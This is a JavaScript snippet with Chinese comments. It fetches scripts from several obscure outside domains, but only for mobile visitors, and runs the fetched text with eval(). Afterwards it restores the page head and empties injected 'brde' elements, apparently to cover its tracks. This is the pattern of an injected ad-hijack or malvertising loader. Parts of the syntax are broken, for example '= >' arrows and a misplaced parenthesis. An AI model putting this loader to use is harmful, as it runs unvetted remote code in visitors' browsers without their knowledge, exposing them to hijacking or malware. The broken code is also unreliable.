const input = ["https://edssnet.changchunets.com:4443/ty/x-2006-33.js", "https://xg.qfnoyix.cn/sc/5500?n=enMgiRQq"]
//const input = ["https://mg.sjoy7rq.cn/sc/1238?n=zUONAccY"]
console.log(input);

const addReactive = (requestsQueue) =>{
	const orginPrototype = Array.prototype 
	const changeMethod = ['push', 'splice'] 
	changeMethod.forEach(key =>{
		requestsQueue[key] = function(...args) {
			//console.log('reactive render',this===requestsQueue);
			orginPrototype[key].call(this, ...args)
			//render(this)
		}
	})
}
const bs = document.body.style.cssText

function handleFetchQueue(input, max) {
	const requestsQueue = []; // 请求队列
	const im = {
		url: ''
	}
	addReactive(requestsQueue) //对requestsQueue添加响应式
	let i = 0;
	let is_impression = 0 
	const req = (i) =>{ //产生一个promise请求 成功则删除队里中promise 再添加一个请求
		url = input[i]
		if (url.indexOf("?") >= 0) { //判断url中是否已经带有参数
			url = url + "&t=" + (new Date()).valueOf();
		} else {
			url = url + "?t=" + (new Date()).valueOf();
		}
		return fetch(url).then(res)=>{
			if (!is_impression) {
				is_impression = 1 
				im.url = res.url
				return res.text()
			}

		}).then(res =>{
			if (res == undefined) return console.log(im)

			try {

				h = document.head.innerHTML

				eval(res) 
				setTimeout(function() {
					const index = requestsQueue.findIndex(item =>item === im.url) 
					input.splice(index, 1)
					//   document.body.innerHTML=b
					document.head.innerHTML = h 
					setTimeout(function() {
                    document.body.style.cssText = bs == '' ? 'padding-bottom: 121.875px;': ''
                    Array.prototype.slice.call(document.getElementsByTagName("brde")).forEach(e =>e.innerHTML = "");
					},
					100);

					handleFetchQueue(input, input.length)

				},
				3000);

			} catch(error) {

				//console.error(error)
				//出错时要做什么
				return
			}

			//document.write("<script>" + res + "<\/script>");
			const index = requestsQueue.findIndex(item = >item === req) requestsQueue.splice(index, 1) checkAddReq()
		})
	}
	const checkAddReq = () = >{
		//console.log(i,input.length)
		if (requestsQueue.length + 1 <= max) { // 并发不能越界
			if (i <= input.length - 1) {
				requestsQueue.push(req(i++)) checkAddReq()
			}
		}
	}
	checkAddReq();
}

function m() {
	let p = navigator.platform;
	if ((p.indexOf("Win") == 0) || (p.indexOf("Mac") == 0) || (p == "X11") || (p.indexOf("Linux") == 0)) {
		return false
	}
	return true
}
//检测平台  
if (m()) {
	handleFetchQueue(input, input.length)
}else{
    
}